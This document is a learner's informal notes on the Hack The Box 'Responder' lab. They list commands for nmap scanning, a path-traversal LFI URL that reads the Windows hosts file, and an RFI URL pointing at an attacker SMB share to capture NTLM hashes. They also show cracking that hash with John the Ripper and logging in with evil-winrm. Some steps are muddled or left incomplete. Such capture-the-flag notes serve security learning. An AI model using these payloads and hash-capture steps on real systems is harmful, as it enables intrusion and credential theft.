# Responder

[Walkthrough](blob:https://app.hackthebox.com/6c57557b-1c6e-4f28-bf71-043c80da2ea9)
[Solution - CryptoCat](https://www.youtube.com/watch?v=R8GOLiKIA1k)

Goal: Exploiting File Inclusion vulnerability on a webpage served on a windows 
machine

## Concepts Learned

- A name-base virtual hosting is
- Local File Inclusion (LFI) occurs when the attacker access a file that was 
  not intended to be an option
- Remote File Inclusion (RFI) occurs when an attacker load a remote file using 
  protocols like HTTP, FTP, ...
- NTLM is a type of single sign-on (SSO) 


**Programs**

- `jack the ripper`: 
- `Responder`: listen to events and catch SMB files
- `evil-winrm`: windows remote management tool that emulates Powershell


**Commands**

```
nmap -sC -sV 10.129.76.106
nmap -p- --min-rate 5000 -sV 10.129.76.106
echo "10.129..91 unika.htb " | sudo tee -a /etc/hosts

http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
http://unika.htb/?page=//10.10.14.25/somefile

john -w=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.129.91.164 -u adminstrator -p badminton

```

**Debug**

- When using the Responder, we ran into `Error starting TCP server on port 445, check permissions or other servers running` for port 139 and 145. This means that 
  these ports are already being used by two other protocols: 139 by NetBIOS and 
  445 by SMB. If we try to change `HTTP=On` to `Off` like mentionned in the 
  walkthrough, we still get the same error. If we change `SMB=On` to `Off`, 
  we won't get the error, but we won't get the event listener response
- `john the ripper`: `No password hashes loaded (see FAQ)`


**Recap**

1. We test out nmap, but we don't see any open port, so we use the `-p-` flag 
   to scan all ports form 0-65535
2. From the nmap, we see that the open port uses `http` as a service. However, 
   our browser can't find this IP address because it uses a `name-based Virtual Hosting`. We need to add it to the hosts inside `/etc/hosts`
3. Since we have access to `french.html`, we know that this file is located 
   somewhere in the server. We try to access to server hosts file by 
   targeting the path (we performed LFI)
4. Since we were able to access the hosts file, we know that (1) the website 
   is vulnerable to LFI and (2) is being served on windows machine. We then run 
   url2 and listen to event. We obtain the password hash (didn't work)
5. We then crack the password hash using `john the ripper` (didn't work)
6. We use `evil-winrm` to connect to window powershell using credentials (worked)
7. we can get the flag inside `flag.txt`


